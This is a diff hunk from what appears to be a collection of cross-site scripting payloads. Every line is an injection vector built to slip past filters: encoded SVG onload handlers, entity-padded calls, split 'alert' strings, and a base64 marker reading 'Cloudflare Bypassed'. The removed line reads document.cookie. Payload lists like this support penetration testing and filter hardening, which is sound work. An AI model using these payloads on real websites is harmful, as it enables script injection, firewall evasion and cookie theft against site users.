@@ -24,7 +24,6 @@ a onclick="alert(1)">XSS</a>
 %3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
-<svg onload=alert&#0000000040document.cookie)>
 <svg onload=alert&#0000000040"1")><””>
 %3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
 %3Csvg%20onload=alert(%22MrHex88%22)%3E
